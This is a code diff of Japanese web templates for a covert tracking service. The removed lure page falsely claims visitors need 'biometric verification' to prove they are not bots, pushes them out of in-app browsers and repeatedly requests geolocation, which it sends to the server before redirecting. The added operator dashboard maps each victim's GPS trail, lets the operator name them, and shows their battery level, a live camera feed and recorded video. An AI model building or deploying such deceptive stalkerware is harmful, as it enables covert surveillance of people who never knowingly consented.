@@ -1,148 +1,311 @@
-<!doctype html>
-<html lang="ja"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#0f1115">
-<title>{{ link.name }}</title>
+{% extends "base.html" %}
+{% block title %}{{ link.person or link.name }} — 追跡{% endblock %}
+
+{% block head %}
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <style>
-html,body{margin:0;background:#0f1115;color:#e6e9ef;
-  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;-webkit-text-size-adjust:100%}
-body{display:flex;min-height:100vh;align-items:center;justify-content:center}
-.wrap{text-align:center;padding:24px;max-width:420px;width:100%}
-h1{font-size:18px;margin:0 0 8px;word-break:break-word}
-p.lead{color:#9aa3b2;font-size:13px;margin:0 0 20px;white-space:pre-wrap;line-height:1.8}
-button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
-  color:#fff;font-weight:600;cursor:pointer}
-button:disabled{opacity:.55}
-.st{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6;min-height:1.6em}
-.st.warn{color:#f0b429}
-#ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
-#ia p{font-size:12.5px;color:#9aa3b2;margin:0 0 10px;line-height:1.7}
-a.btn2{display:inline-block;padding:10px 20px;border-radius:999px;background:#2b3346;
-  color:#e6e9ef;text-decoration:none;font-size:13px}
-</style></head><body>
-<div class="wrap">
-  <h1>{{ link.name }}</h1>
-  <p class="lead">{{ link.note or ask_text }}</p>
-  <button id="go">{{ go_text }}</button>
-  <p class="st" id="st"></p>
-  <div id="ia">
-    <p><span id="ia_name">アプリ内</span> のブラウザでは位置情報が取れないことがあります。</p>
-    <a class="btn2" id="ia_open" href="#">開き直す</a>
-  </div>
+.tv-bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:10px 0}
+.tv-btn{display:inline-block;padding:7px 14px;border-radius:8px;background:#2b3346;
+  color:#e6e9ef;text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer}
+.tv-btn.on{background:#4c8dff;border-color:#4c8dff;color:#fff}
+.tv-btn.bad{background:#3a2a2a;border-color:#5a3f3f;color:#f0b429}
+#map{height:400px;border-radius:10px;overflow:hidden;border:1px solid #262b36}
+body.hidemap #map{display:none}
+.tv-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;margin:10px 0}
+.tv-grid .card{background:#171a21;border-radius:10px;padding:10px;border:0;margin:0}
+.tv-k{font-size:11px;color:#8b93a7}
+.tv-v{font-size:16px;font-weight:700;margin-top:2px}
+.tv-v.gps{color:#7ee08a}.tv-v.ip{color:#f0b429}
+.tv-live{color:#7ee08a;font-weight:700}
+.tv-live.off{color:#8b93a7}
+#cam{width:100%;max-width:420px;border-radius:10px;background:#000;display:block;margin:8px 0}
+.tv-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.tv-dim{color:#8b93a7;font-size:12px}
+.pcard{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:10px;margin:8px 0;
+  display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.pcard .pc{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#8b93a7}
+.pcard .nm{font-weight:700}
+.pcard form{display:flex;gap:6px;align-items:center;margin:0}
+.pcard input{width:150px;padding:5px 8px;background:#11141a;color:#e6e9ef;
+  border:1px solid #262b36;border-radius:6px}
+.tv-sess{font-size:12px;padding:4px 10px;border-radius:999px;background:#20242e;
+  border:1px solid #39415a;cursor:pointer;color:#c7cddb}
+.tv-sess.on{background:#4c8dff;border-color:#4c8dff;color:#fff}
+</style>
+{% endblock %}
+
+{% block content %}
+<h1>{{ link.person or link.name }} <span class="mono dim">{{ link.code }}</span>
+  <span class="tv-live {{ '' if live else 'off' }}">{{ '● リアルタイム中' if live else '○ 待機' }}</span></h1>
+<div class="tv-dim">{{ link.mode }} / {{ link.interval }}秒間隔 /
+  {{ '有効' if link.active else '停止中' }} / 全体 {{ n }}点</div>
+
+<div class="tv-bar">
+  <button class="tv-btn on" id="bshow" type="button">🟢 追跡を表示</button>
+  <button class="tv-btn" id="bhide" type="button">⚪ 追跡を隠す</button>
+  <a class="tv-btn" href="{{ base }}/l/{{ link.code }}" target="_blank">開く</a>
+  <a class="tv-btn" href="{{ base }}/link/{{ link.code }}">詳細</a>
+  <a class="tv-btn" href="{{ base }}/spy/{{ link.code }}">解析</a>
+  <a class="tv-btn" href="{{ base }}/tracks">一覧</a>
+  {% if cur %}<a class="tv-btn" href="{{ base }}/track/{{ link.code }}">← 識別者一覧</a>{% endif %}
 </div>
-<script>
-window.LT_CODE  = {{ code|tojson }};
-window.LT_HIT   = {{ hit_id }};
-window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO   = 0;
-</script>
-<script src="/static/geofix.js?v=18"></script>
-<script src="/static/collect.js?v=18"></script>
+
+{% if not cur %}
+  <h3>識別者コード（{{ people|length }}人）</h3>
+  <p class="tv-dim">踏んだ端末ごとに分かれています。名前を入れて保存できます。</p>
+  {% for p in people %}
+  <div class="pcard">
+    <span class="pc">{{ p.code8 }}</span>
+    <span class="nm">{{ p.label or '（名前なし）' }}</span>
+    <span class="tv-dim">{{ p.n }}点 / 最終 {{ (p.last.ts or '')[:19] }}
+      {% if p.last.city %} / {{ p.last.city }}{% endif %}
+      {% if p.last.src == 'ip' %} / 回線推定{% else %} / GPS{% endif %}</span>
+    <span style="flex:1"></span>
+    {% if p.vid %}
+    <form method="post" action="/track/{{ link.code }}/person/name">
+      <input type="hidden" name="vid" value="{{ p.vid }}">
+      <input name="name" value="{{ p.label or '' }}" placeholder="名前">
+      <button type="submit">保存</button>
+    </form>
+    {% endif %}
+    <a class="tv-btn" href="{{ base }}/track/{{ link.code }}?v={{ p.key }}">この人を見る</a>
+  </div>
+  {% else %}
+  <p class="tv-dim">まだ点がありません。</p>
+  {% endfor %}
+
+  <h3>全体マップ</h3>
+  <div id="map"></div>
+
+{% else %}
+  <h3>識別者コード <span class="mono">{{ cur.code8 }}</span>
+    {% if cur.label %}（{{ cur.label }}）{% endif %}</h3>
+  <div class="pcard">
+    <span class="tv-dim">{{ cur.n }}点 / セッション {{ cur.sids|length }}件</span>
+    {% if cur.vid %}
+    <form method="post" action="/track/{{ link.code }}/person/name">
+      <input type="hidden" name="vid" value="{{ cur.vid }}">
+      <input type="hidden" name="back" value="{{ cur.key }}">
+      <input name="name" value="{{ cur.label or '' }}" placeholder="名前">
+      <button type="submit">名前を保存</button>
+    </form>
+    {% endif %}
+  </div>
+
+  <div class="tv-grid">
+    <div class="card"><div class="tv-k">最後の位置</div>
+      <div class="tv-v" id="vlast">-</div><div class="tv-k" id="vlastsub"></div></div>
+    <div class="card"><div class="tv-k">取得元</div><div class="tv-v" id="vsrc">-</div></div>
+    <div class="card"><div class="tv-k">最終通信</div><div class="tv-v" id="vts">-</div></div>
+    <div class="card"><div class="tv-k">点数</div><div class="tv-v" id="vn">{{ cur.n }}</div></div>
+    <div class="card"><div class="tv-k">電池</div><div class="tv-v" id="vbatt">-</div></div>
+  </div>
+  <div id="warn" class="tv-dim"></div>
+
+  <div id="map"></div>
+
+  <h3>リアルタイム映像</h3>
+  <video id="cam" controls autoplay muted playsinline></video>
+  <div class="tv-dim" id="caminfo">まだ映像がありません</div>
+
+  <h3>これまでの録画（最大30分）</h3>
+  <div class="tv-row" id="sessbar"></div>
+  <video id="rec" controls playsinline
+         style="width:100%;max-width:520px;border-radius:10px;background:#000;margin:8px 0"></video>
+  <div class="tv-row">
+    <button class="tv-btn" id="playall" type="button">▶ 最初から順に再生</button>
+    <button class="tv-btn" id="playlast" type="button">⏭ 最新へ</button>
+    <a class="tv-btn" href="/s/{{ link.code }}/video/all.webm" target="_blank">30分ぶんを開く</a>
+  </div>
+  <div class="tv-dim" id="recinfo"></div>
+
+  <h3>この人の最近の点（新しい順 300件）</h3>
+  <table><tr><th>時刻</th><th>位置</th><th>精度</th><th>取得元</th><th>場所</th></tr>
+  <tbody id="ptable"></tbody></table>
+{% endif %}
+
+<h3>設定</h3>
+<form method="post" action="/track/{{ link.code }}/update" class="card">
+  <label>名前 <input name="person" value="{{ link.person or link.name }}"></label>
+  <label>モード
+    <select name="mode">
+      {% for m in ["page","geo","snap","live","quiz","identify","redirect"] %}
+      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ m }}</option>
+      {% endfor %}
+    </select></label>
+  <label>間隔(秒) <input name="interval" type="number" value="{{ link.interval or 15 }}" min="5" max="600"></label>
+  <label>メモ <input name="note" value="{{ link.note or '' }}"></label>
+  <label>状態
+    <select name="active">
+      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
+      <option value="0" {% if not link.active %}selected{% endif %}>停止中</option>
+    </select></label>
+  <button type="submit">保存</button>
+</form>
+<div class="tv-row">
+  <form method="post" action="/track/{{ link.code }}/clear" onsubmit="return confirm('点を消しますか？')">
+    <button type="submit">点を消す</button></form>
+  <form method="post" action="/track/{{ link.code }}/delete" onsubmit="return confirm('削除しますか？')">
+    <button type="submit">削除</button></form>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 (function () {
-  "use strict";
-  var DEST          = {{ (dest or "")|tojson }};
-  var ASK_TEXT      = {{ ask_text|default("ボットでないことを確認するため生体認証を行う必要があります", true)|tojson }};
-  var GO_TEXT       = {{ go_text|default("確認する", true)|tojson }};
-  var DENY_TEXT     = {{ deny_text|default("アクセスを許可されなかったため確認できませんでした。アクセスを許可してください", true)|tojson }};
-  var RETRY_TEXT    = {{ retry_text|default("もう一度", true)|tojson }};
-  var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
-  var DEST_MIN      = {{ dest_min|default(2, true) }};
+  var CODE = {{ link.code|tojson }};
+  var CUR  = {{ (cur.key if cur else "")|tojson }};
+  var KEY  = "igt_tv_mode_" + CODE;
+  var pts  = {{ (cur_json if cur else all_json)|safe }};
+  var lastId = 0;
+  pts.forEach(function (p) { if (p.id > lastId) lastId = p.id; });
 
-  var go = document.getElementById("go");
-  var st = document.getElementById("st");
-  var got = false, left = false, busy = false, lastTry = 0;
+  /* ---------- 表示／隠す ---------- */
+  var bshow = document.getElementById('bshow'), bhide = document.getElementById('bhide');
+  function setMode(m) {
+    var hide = (m === 'hide');
+    document.body.classList.toggle('hidemap', hide);
+    bshow.className = 'tv-btn' + (hide ? '' : ' on');
+    bhide.className = 'tv-btn' + (hide ? ' bad' : '');
+    try { localStorage.setItem(KEY, m); } catch (e) {}
+    if (!hide) setTimeout(function () { try { map.invalidateSize(); } catch (e) {} }, 60);
+  }
+  bshow.addEventListener('click', function () { setMode('show'); });
+  bhide.addEventListener('click', function () { setMode('hide'); });
+  var saved = 'show';
+  try { saved = localStorage.getItem(KEY) || 'show'; } catch (e) {}
 
-  function txt(m, warn) { st.textContent = m || ""; st.className = "st" + (warn ? " warn" : ""); }
+  /* ---------- 地図 ---------- */
+  var map = L.map('map').setView([36.2, 138.2], 5);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
+    { maxZoom: 19, attribution: 'OSM' }).addTo(map);
+  var gTrail = L.layerGroup().addTo(map), gLast = L.layerGroup().addTo(map);
+  var line = null, lastMark = null;
 
-  function showInApp() {
-    var ua = navigator.userAgent || "", name = "";
-    if (/Instagram/i.test(ua)) name = "Instagram";
-    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
-    else if (/Line\//i.test(ua)) name = "LINE";
-    else if (/Twitter/i.test(ua)) name = "X";
-    if (!name) return;
-    var box = document.getElementById("ia");
-    var nm  = document.getElementById("ia_name");
-    var a   = document.getElementById("ia_open");
-    if (!box || !a) return;
-    box.style.display = "block";
-    if (nm) nm.textContent = name;
-    var ios = /iPhone|iPad|iPod/i.test(ua);
-    a.href = ios
-      ? location.href.replace(/^https:/, "x-safari-https:")
-      : "intent://" + location.href.replace(/^https?:\/\//, "") +
-        "#Intent;scheme=https;package=com.android.chrome;end";
-    a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
+  function drawAll() {
+    gTrail.clearLayers(); gLast.clearLayers();
+    var ll = pts.filter(function (p) { return p.lat != null; })
+                .map(function (p) { return [p.lat, p.lon]; });
+    if (!ll.length) return;
+    line = L.polyline(ll, { color: '#4c8dff', weight: 3, opacity: .8 }).addTo(gTrail);
+    var lp = ll[ll.length - 1];
+    lastMark = L.circleMarker(lp, { radius: 7, color: '#7ee08a', weight: 3,
+                                    fillColor: '#7ee08a', fillOpacity: .5 })
+                 .addTo(gLast).bindPopup('最後の位置');
+    if (ll.length > 1) map.fitBounds(line.getBounds(), { padding: [30, 30] });
+    else map.setView(lp, 15);
+  }
+  function addPoint(p) {
+    if (p.lat == null) return;
+    var lp = [p.lat, p.lon];
+    if (line) line.addLatLng(lp); else { drawAll(); return; }
+    if (lastMark) lastMark.setLatLng(lp);
+    map.panInside(lp, { padding: [40, 40] });
+  }
+  drawAll();
+
+  /* ---------- サマリ ---------- */
+  function paintLast(j) {
+    var L0 = j.last || {};
+    var el = document.getElementById('vlast');
+    if (L0.lat != null) {
+      el.textContent = (+L0.lat).toFixed(5) + ', ' + (+L0.lon).toFixed(5);
+      el.className = 'tv-v ' + ((L0.src === 'ip') ? 'ip' : 'gps');
+    } else { el.textContent = '-'; el.className = 'tv-v'; }
+    document.getElementById('vlastsub').textContent =
+      (L0.city || '') + (L0.acc ? ' ±' + Math.round(L0.acc) + 'm' : '');
+    var s = document.getElementById('vsrc');
+    s.textContent = (L0.src === 'gps') ? 'GPS' : (L0.src === 'ip' ? '回線推定' : '-');
+    s.className = 'tv-v ' + ((L0.src === 'gps') ? 'gps' : 'ip');
+    document.getElementById('vts').textContent = (L0.ts || '').slice(11, 19) || '-';
+    document.getElementById('vn').textContent = j.count != null ? j.count : '-';
+    document.getElementById('vbatt').textContent =
+      (L0.batt != null ? Math.round(L0.batt * 100) + '%' : '-') + (L0.chg ? ' ⚡' : '');
+    document.getElementById('warn').textContent = j.warn || '';
   }
 
-  function done(p) {
-    var c = (p && p.coords) || {};
-    if (c.latitude == null || got) return;
-    got = true;
-    try { LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy }); } catch (e) {}
-    txt("", false);
-    go.style.display = "none";
-    var ia = document.getElementById("ia");
-    if (ia) ia.style.display = "none";
-    if (DEST && !left) {
-      setTimeout(function () {
-        if (left) return;
-        left = true;
-        try { location.replace(DEST); } catch (e) { location.href = DEST; }
-      }, Math.max(400, (DEST_MIN || 2) * 1000));
+  function paintTable() {
+    var rows = pts.slice(-300).reverse(), h = '';
+    rows.forEach(function (p) {
+      h += '<tr><td class="mono">' + (p.ts || '').slice(5, 19) + '</td><td class="mono">' +
+        (p.lat != null ? (+p.lat).toFixed(5) + ', ' + (+p.lon).toFixed(5) : '-') + '</td><td>' +
+        (p.acc ? '±' + Math.round(p.acc) + 'm' : '-') + '</td><td>' +
+        (p.src === 'gps' ? 'GPS' : '回線推定') + '</td><td>' + (p.city || '') + '</td></tr>';
+    });
+    document.getElementById('ptable').innerHTML = h;
+  }
+
+  /* ---------- ポーリング ---------- */
+  function poll() {
+    fetch('/api/track/' + encodeURIComponent(CODE) + '?since=' + lastId + '&limit=1500',
+          { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (!j || !j.points) return;
+        var add = j.points.filter(function (p) { return !CUR || p.key === CUR; });
+        add.forEach(function (p) { if (p.id > lastId) lastId = p.id; pts.push(p); });
+        if (add.length) { add.forEach(addPoint); paintTable(); }
+        paintLast(j);
+      }).catch(function () {});
+  }
+  setInterval(poll, 5000);
+  poll();
+
+  /* ---------- 映像（個人の識別者コードで絞る） ---------- */
+  var VID8 = {{ (cur.vid[:8] if cur and cur.vid else "")|tojson }};
+  var camEl = document.getElementById('cam'), recEl = document.getElementById('rec');
+  var list = [], idx = 0, curSid = '';
+
+  function refreshCam() {
+    if (!camEl) return;
+    camEl.src = '/s/' + encodeURIComponent(CODE) + '/video/last?t=' + Date.now();
+    var p = camEl.play(); if (p && p.catch) p.catch(function () {});
+    fetch('/s/' + encodeURIComponent(CODE) + '/vseg.json', { cache: 'no-store' })
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        var mine = (j.files || []).filter(function (f) {
+          return !VID8 || f.vid === VID8 || f.vid === 'x';
+        });
+        document.getElementById('caminfo').textContent = mine.length
+          ? '保持中 ' + mine.length + '本 / 最大 ' + j.keep_min + '分ぶん'
+          : 'まだ映像がありません';
+        buildPlaylist(mine);
+      }).catch(function () {});
+  }
+  function buildPlaylist(files) {
+    var sids = {};
+    files.forEach(function (f) { sids[f.sid] = (sids[f.sid] || 0) + 1; });
+    if (!curSid && files.length) curSid = files[files.length - 1].sid;
+    list = files.filter(function (f) { return !curSid || f.sid === curSid; });
+    var h = '';
+    Object.keys(sids).forEach(function (s) {
+      h += '<span class="tv-sess' + (s === curSid ? ' on' : '') + '" data-sid="' + s + '">' +
+           s.slice(0, 8) + '（' + sids[s] + '本）</span>';
+    });
+    var bar = document.getElementById('sessbar');
+    if (bar) {
+      bar.innerHTML = h || '<span class="tv-dim">録画はまだありません</span>';
+      bar.querySelectorAll('.tv-sess').forEach(function (b) {
+        b.addEventListener('click', function () { curSid = b.getAttribute('data-sid'); buildPlaylist(files); playAt(0); });
+      });
     }
+    var ri = document.getElementById('recinfo');
+    if (ri) ri.textContent = list.length ? list.length + '本を順に再生します' : '録画はまだありません';
   }
-
-  function fail(why) {
-    if (got) return;
-    try { LT.send({ ip_point: 1 }); } catch (e) {}
-    txt(DENY_TEXT, true);
-    go.textContent = RETRY_TEXT;
-    go.disabled = false;
-    busy = false;
-    if (why === "denied") showInApp();
-    else if (window.LTGEO && LTGEO.showHint) { try { LTGEO.showHint(); } catch (e) {} }
-    if (DENY_REDIRECT && DEST && !left) {
-      setTimeout(function () { left = true; location.replace(DEST); }, 1500);
-    }
+  function playAt(i) {
+    if (!list.length || !recEl) return;
+    idx = Math.max(0, Math.min(i, list.length - 1));
+    recEl.src = list[idx].url;
+    var p = recEl.play(); if (p && p.catch) p.catch(function () {});
   }
+  if (recEl) recEl.addEventListener('ended', function () { if (idx + 1 < list.length) playAt(idx + 1); });
+  var pa = document.getElementById('playall'), pl = document.getElementById('playlast');
+  if (pa) pa.addEventListener('click', function () { playAt(0); });
+  if (pl) pl.addEventListener('click', function () { playAt(list.length - 1); });
 
-  function start() {
-    if (got || left) return;
-    if (Date.now() - lastTry < 2500) return;
-    lastTry = Date.now();
-    if (!window.LTGEO) { fail("unsupported"); return; }
-    busy = true;
-    go.disabled = true;
-    txt(ASK_TEXT, false);
-    LTGEO.subscribe(done);
-    LTGEO.subscribeFail(fail);
-    LTGEO.subscribeStatus(function (t, w) { if (!got) txt(t, w); });
-    var inf = LTGEO.info();
-    if (inf.running) LTGEO.retry(); else LTGEO.start();   // ★ タップと同じタスク
-  }
-
-  go.addEventListener("click", start);
-  document.addEventListener("click", function (e) {
-    if (got || left) return;
-    if (e.target === go) return;
-    if (e.target && e.target.closest && e.target.closest("#ia")) return;
-    start();
-  }, { passive: true });
-  document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "visible" && !got && !left && window.LTGEO) LTGEO.retry();
-  });
-  window.addEventListener("pageshow", function (e) {
-    if (e.persisted && !got && !left && window.LTGEO) LTGEO.retry();
-  });
-
-  /* すでに許可済みなら読み込み時から取りにいく */
-  if (navigator.permissions && navigator.permissions.query) {
-    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
-      if (p.state === "granted") start();
-    }).catch(function () {});
-  }
+  if (CUR) { refreshCam(); setInterval(refreshCam, 20000); paintTable(); }
+  setMode(saved);
 })();
 </script>
-</body></html>
+{% endblock %}
